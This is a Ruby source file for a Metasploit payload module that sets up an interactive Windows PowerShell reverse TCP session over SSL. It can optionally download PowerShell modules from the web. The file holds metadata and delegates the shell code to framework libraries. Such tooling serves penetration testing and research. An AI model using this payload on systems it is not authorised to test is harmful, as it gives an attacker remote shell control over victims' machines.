##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/powershell'
require 'msf/core/payload/windows/powershell'
require 'msf/core/handler/reverse_tcp_ssl'

module MetasploitModule

  CachedSize = 1561

  include Msf::Payload::Single
  include Rex::Powershell::Command
  include Msf::Payload::Windows::Powershell

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Interactive Powershell Session, Reverse TCP',
      'Description'   => 'Interacts with a powershell session on an established socket connection',
      'Author'        =>
        [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    =>
        [
          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'windows',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcpSsl,
      'Session'       => Msf::Sessions::PowerShell,
      'RequiredCmd'   => 'generic',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
      register_options(
      [
        OptString.new('LOAD_MODULES', [ false, "A list of powershell modules seperated by a comma to download over the web", nil ]),
      ])
  end

  def generate
    generate_powershell_code("Reverse")
  end
end
